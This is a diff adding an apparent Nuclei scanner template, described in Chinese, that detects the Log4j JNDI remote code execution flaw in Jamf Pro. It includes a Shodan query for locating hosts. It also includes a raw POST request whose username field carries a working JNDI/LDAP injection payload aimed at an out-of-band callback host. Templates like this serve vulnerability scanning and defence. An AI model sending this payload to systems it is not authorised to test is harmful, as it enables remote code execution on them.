@@ -1,0 +1,27 @@
+id: jamf-pro-log4j-rce
+
+info:
+  name: JamF Pro - 远程命令执行 (Apache Log4j)
+  author: DhiyaneshDK,pdteam
+  severity: critical
+  description: |
+    JamF容易受到Lof4j JNDI远程代码执行的影响.
+    JamF是管理iOS设备(iphone和ipad)、macOS电脑(macbook、imac等)和tvOS设备(Apple TV)的行业标准.
+  reference:
+    - https://github.com/random-robbie/jamf-log4j
+  metadata:
+    max-request: 1
+    shodan-query: title:"Jamf Pro"
+    verified: "true"
+  tags: jamf
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=${jndi:ldap://{{interactsh}}/{{body}}}&password=
